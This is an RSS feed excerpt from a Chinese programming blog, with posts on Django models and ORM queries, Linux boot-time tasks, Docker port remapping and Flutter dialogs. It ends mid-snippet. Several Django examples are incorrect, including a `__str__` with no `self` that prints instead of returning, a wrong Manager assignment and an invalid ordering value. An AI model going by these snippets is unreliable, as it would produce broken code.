    &lt;span style=&#34;color:#75715e&#34;&gt;# ...&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Pizza&lt;/span&gt;(models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Model):
    &lt;span style=&#34;color:#75715e&#34;&gt;# ...&lt;/span&gt;
    toppings &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ManyToManyField(Topping)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c一对一&#34;&gt;c.一对一&lt;/h3&gt;
&lt;p&gt;字段 OneToOneField&lt;/p&gt;
&lt;p&gt;事实上，处理这通常使用继承，它涉及隐式的一对一关系，这里不展开细讲。&lt;/p&gt;
&lt;h2 id=&#34;5meta-选项&#34;&gt;5.Meta 选项&lt;/h2&gt;
&lt;p&gt;Django 模型类的 Meta 是一个内部类，它用于定义一些 Django 模型类的行为特性。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;abstract：定义当前的模型是不是一个抽象类。所谓抽象类是不会对应数据库表的。一般我们用它来归纳一些公共属性字段，然后继承它的子类可以继承这些字段。&lt;/li&gt;
&lt;li&gt;get_latest_by：指定一个 DateField 或者 DateTimeField。这个设置让你在使用 model 的 Manager 上的 lastest 方法时，默认使用指定字段来排序。&lt;/li&gt;
&lt;li&gt;ordering：这个字段是告诉 Django 模型对象返回的记录结果集是按照哪个字段排序的。这是一个字符串的元组或列表，没有一个字符串都是一个字段和用一个可选的表明降序的&#39;-&amp;lsquo;构成。当字段名前面没有&amp;rsquo;-&amp;lsquo;时，将默认使用升序排列。使用&amp;rsquo;?&amp;lsquo;将会随机排列。&lt;/li&gt;
&lt;li&gt;verbose_name：给模型类起一个更可读的名字，一般定义为中文。&lt;/li&gt;
&lt;li&gt;verbose_name_plural：指定模型的复数形式是什么。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Ox&lt;/span&gt;(models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Model):
    horn_length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;IntegerField()

    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Meta&lt;/span&gt;:
        ordering &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;horn_length&amp;#34;&lt;/span&gt;]
        verbose_name_plural &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;oxen&amp;#34;&lt;/span&gt;
        ordering&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;order_date&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#75715e&#34;&gt;# 按订单升序排列&lt;/span&gt;
        ordering&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-order_date&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#75715e&#34;&gt;# 按订单降序排列，-表示降序&lt;/span&gt;
        ordering&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;?order_date&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#75715e&#34;&gt;# 随机排序，？表示随机&lt;/span&gt;
        ordering&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-pub_date&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;author&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#75715e&#34;&gt;# 以pub_date为降序，在以author升序排列&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6模型方法&#34;&gt;6.模型方法&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;__str__()&lt;/code&gt;：Python“魔术方法”，返回任何对象的字符串表示形式。这是 Python 和 Django 在模型实例需要被强制并显示为纯字符串时将使用的内容。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Topping&lt;/span&gt;(models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Model):
    &lt;span style=&#34;color:#75715e&#34;&gt;# ...&lt;/span&gt;
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __str__():
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Topping&amp;#39;&lt;/span&gt;)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7模型属性&#34;&gt;7.模型属性&lt;/h2&gt;
&lt;p&gt;模型最重要的属性是 Manager。使用 Manager 定义 objects，为 Django 模型提供数据库查询操作的接口，用于从数据库中检索实例。如果 Manager 未定义，管理员只能通过模型类访问，而不能通过模型实例访问。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;objects &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;manager
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;8增删查改&#34;&gt;8.增删查改&lt;/h2&gt;
&lt;h3 id=&#34;增&#34;&gt;增&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;UserInfo&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create(user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yangmv&amp;#39;&lt;/span&gt;,pwd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;123456&amp;#39;&lt;/span&gt;)
obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;UserInfo(user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yangmv&amp;#39;&lt;/span&gt;,pwd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;123456&amp;#39;&lt;/span&gt;)
obj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;save()
dic &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yangmv&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pwd&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;123456&amp;#39;&lt;/span&gt;}
models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;UserInfo&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create(&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;dic)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;删&#34;&gt;删&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;UserInfo&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yangmv&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;delete()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查&#34;&gt;查&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;UserInfo&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;all()
models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;UserInfo&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;all()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# 只取 user 列&lt;/span&gt;
models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;UserInfo&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;all()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values_list(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# 取出 id 和 user 列，并生成一个列表&lt;/span&gt;
models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;UserInfo&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;UserInfo&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yangmv&amp;#39;&lt;/span&gt;)
models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Tb1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(id__in&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;])  &lt;span style=&#34;color:#75715e&#34;&gt;# 获取 id 等于 11、22、33 的数据&lt;/span&gt;
models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Tb1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exclude(id__in&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;]) &lt;span style=&#34;color:#75715e&#34;&gt;# not in&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;改&#34;&gt;改&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;UserInfo&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yangmv&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;update(pwd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;520&amp;#39;&lt;/span&gt;)
obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;UserInfo&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yangmv&amp;#39;&lt;/span&gt;)
obj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pwd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;520&amp;#39;&lt;/span&gt;
obj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;save()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—设置开机启动任务</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E4%BB%BB%E5%8A%A1/</link>
        <pubDate>Tue, 01 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E4%BB%BB%E5%8A%A1/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.jb51.net/article/176257.htm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Linux 添加开机启动方法(服务/脚本)  @jb51 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1系统启动文件&#34;&gt;1.系统启动文件&lt;/h2&gt;
&lt;p&gt;系统启动时按顺序加载以下的配置文件，要设置开机启动任务即修改以下部分文件&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/etc/profile、/root/.bash_profile
/etc/bashrc、/root/.bashrc
/etc/profile.d/*.sh、/etc/profile.d/lang.sh
/etc/sysconfig/i18n、/etc/rc.local（/etc/rc.d/rc.local）
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2修改开机启动文件etcrclocal或者etcrcdrclocal&#34;&gt;2.修改开机启动文件：/etc/rc.local（或者/etc/rc.d/rc.local）&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 1.编辑rc.local文件
[root@localhost ~]# vi /etc/rc.local
 
# 2.修改rc.local文件，在 exit 0 前面加入以下命令。保存并退出。
/etc/init.d/mysqld start                     # mysql开机启动
/etc/init.d/nginx start                     # nginx开机启动
supervisord -c /etc/supervisor/supervisord.conf         # supervisord开机启动
/bin/bash /server/scripts/test.sh &amp;gt;/dev/null 2&amp;gt;/dev/null
 
# 3.最后修改rc.local文件的执行权限
[root@localhost ~]# chmod +x /etc/rc.local
[root@localhost ~]# chmod 755 /etc/rc.local
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3shell脚本的启动&#34;&gt;3.shell脚本的启动&lt;/h2&gt;
&lt;p&gt;将写好的脚本（.sh文件）放到目录 /etc/profile.d/  下，系统启动后就会自动执行该目录下的所有shell脚本。&lt;/p&gt;
&lt;h2 id=&#34;4通过chkconfig命令设置&#34;&gt;4.通过chkconfig命令设置&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 1.将(脚本)启动文件移动到 /etc/init.d/ 或者 /etc/rc.d/init.d/ 目录下。（前者是后者的软连接）
mv /www/wwwroot/test.sh /etc/rc.d/init.d
 
# 2.启动文件前面务必添加如下三行代码，否侧会提示chkconfig不支持。
#!/bin/sh             告诉系统使用的shell,所以的shell脚本都是这样
#chkconfig: 35 20 80        分别代表运行级别，启动优先权，关闭优先权，此行代码必须
#description: http server     自己随便发挥！！！，此行代码必须
/bin/echo $(/bin/date +%F_%T) &amp;gt;&amp;gt; /tmp/test.log
 
# 3.增加脚本的可执行权限
chmod +x /etc/rc.d/init.d/test.sh
 
# 4.添加脚本到开机自动启动项目中。添加到chkconfig，开机自启动。
[root@localhost ~]# cd /etc/rc.d/init.d
[root@localhost ~]# chkconfig --add test.sh
[root@localhost ~]# chkconfig test.sh on
 
# 5.关闭开机启动 
[root@localhost ~]# chkconfig test.sh off
 
# 6.从chkconfig管理中删除test.sh
[root@localhost ~]# chkconfig --del test.sh
 
# 7.查看chkconfig管理
[root@localhost ~]# chkconfig --list test.sh
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;5自定义服务文件-通过systemctl管理&#34;&gt;5.自定义服务文件, 通过Systemctl管理&lt;/h2&gt;
&lt;h3 id=&#34;1写服务文件&#34;&gt;1.写服务文件&lt;/h3&gt;
&lt;p&gt;如 nginx.service、redis.service、supervisord.service&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[Unit]:服务的说明
Description:描述服务
After:描述服务类别
 
[Service]服务运行参数的设置
Type=forking      是后台运行的形式
ExecStart        为服务的具体运行命令
ExecReload       为服务的重启命令
ExecStop        为服务的停止命令
PrivateTmp=True     表示给服务分配独立的临时空间
注意：启动、重启、停止命令全部要求使用绝对路径
 
[Install]        服务安装的相关设置，可设置为多用户
WantedBy=multi-user.target 
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;2文件以754的权限保存&#34;&gt;2.文件以754的权限保存&lt;/h3&gt;
&lt;p&gt;目录路径：/usr/lib/systemd/system。如上面的supervisord.service文件放在这个目录下面。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[root@localhost ~]# cat /usr/lib/systemd/system/nginx.service
[root@localhost ~]# cat /usr/lib/systemd/system/supervisord.service
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;3设置开机自启动&#34;&gt;3.设置开机自启动&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;设置开机自启动
[root@localhost ~]# systemctl enable nginx.service    
[root@localhost ~]# systemctl enable supervisord
 
停止开机自启动
[root@localhost ~]# systemctl disable nginx.service
[root@localhost ~]# systemctl disable supervisord
 
验证一下是否为开机启动
[root@localhost ~]# systemctl is-enabled nginx
[root@localhost ~]# systemctl is-enabled supervisord
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;4服务文件示例&#34;&gt;4.服务文件示例&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# supervisord.service进程管理服务文件
[Unit]
Description=Process Monitoring and Control Daemon  # 内容自己定义：Description=Supervisor daemon
After=rc-local.service nss-user-lookup.target
 
[Service]
Type=forking
ExecStart=/usr/bin/supervisord -c /etc/supervisor/supervisord.conf
ExecStop= /usr/bin/supervisorctl shutdown 
ExecReload=/usr/bin/supervisorctl reload
Restart=on-failure
RestartSec=42s
KillMode=process 
 
[Install]
WantedBy=multi-user.target
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Docker—修改容器端口映射</title>
        <link>https://ac-lm.github.io/posts/docker/docker%E4%BF%AE%E6%94%B9%E5%AE%B9%E5%99%A8%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/</link>
        <pubDate>Mon, 31 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/docker/docker%E4%BF%AE%E6%94%B9%E5%AE%B9%E5%99%A8%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/</guid>
        <description>&lt;h2 id=&#34;1找到docker的配置文件&#34;&gt;1.找到docker的配置文件&lt;/h2&gt;
&lt;p&gt;使用 &lt;code&gt;docker ps -a&lt;/code&gt; 命令找到要修改容器的 CONTAINER ID&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205050954001.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205050954001.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;运行 &lt;code&gt;docker inspect 【CONTAINER ID】 | grep Id&lt;/code&gt; 命令，根据容器ID找到文件ID&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205050954517.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205050954517.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;执行 &lt;code&gt;cd /var/lib/docker/containers&lt;/code&gt; 命令进入 docker 容器文件夹，找到与 文件ID 相同的目录&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205050954626.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205050954626.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;2修改docker的配置文件&#34;&gt;2.修改docker的配置文件&lt;/h2&gt;
&lt;p&gt;停止 docker 引擎服务，systemctl stop docker 或者 service docker stop&lt;/p&gt;
&lt;p&gt;进入对应 文件ID 所在目录，修改 hostconfig.json 两个文件&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205050954685.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205050954685.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;把 8080 映照到 80，重启服务 systemctl start docker&lt;/p&gt;
&lt;p&gt;【PS】或修改 vi config.v2.json，找到 ExposedPorts 和 Ports 对应项，还是仿照原先的内容添加自己所需要的端口映射&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Flutter—内置对话框</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E5%86%85%E7%BD%AE%E5%AF%B9%E8%AF%9D%E6%A1%86/</link>
        <pubDate>Wed, 19 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E5%86%85%E7%BD%AE%E5%AF%B9%E8%AF%9D%E6%A1%86/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.imooc.com/article/302188&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Flutter内置show @老孟Flutter &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1showdialog&#34;&gt;1.showDialog&lt;/h2&gt;
&lt;p&gt;showDialog 用于弹出普通 Material 风格的对话框，用法如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;showDialog(
    context: context,
    builder: (context) {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; AlertDialog(
        ...
      );
    }
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2showcupertinodialog&#34;&gt;2.showCupertinoDialog&lt;/h2&gt;
&lt;p&gt;showCupertinoDialog 用于弹出 ios 风格对话框，基本用法如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;showCupertinoDialog(
    context: context,
    builder: (context) {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; CupertinoAlertDialog(
       ...
      );
    });
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3showaboutdialog&#34;&gt;3.showAboutDialog&lt;/h2&gt;
&lt;p&gt;AboutDialog 用于描述当前 App 信息，底部提供 2 个按钮：查看许可按钮和关闭按钮。AboutDialog 需要和 showAboutDialog 配合使用，用法如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;showAboutDialog(
  context: context,
  applicationIcon: Image.asset(
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;images/bird.png&amp;#39;&lt;/span&gt;,
    height: &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;,
    width: &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;,
  ),
  applicationName: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;应用程序&amp;#39;&lt;/span&gt;,
  applicationVersion: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1.0.0&amp;#39;&lt;/span&gt;,
  applicationLegalese: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;copyright 老孟，一枚有态度的程序员&amp;#39;&lt;/span&gt;,
  children: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;Widget&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;[
    Container(
      height: &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;,
      color: Colors.red,
    ),
    Container(
      height: &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;,
      color: Colors.blue,
    ),
    Container(
      height: &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;,
      color: Colors.green,
    )
  ],
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4showmodalbottomsheet&#34;&gt;4.showModalBottomSheet&lt;/h2&gt;
&lt;p&gt;从底部弹出，通常和 BottomSheet 配合使用，用法如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;showModalBottomSheet(
        context: context,
        builder: (BuildContext context) {
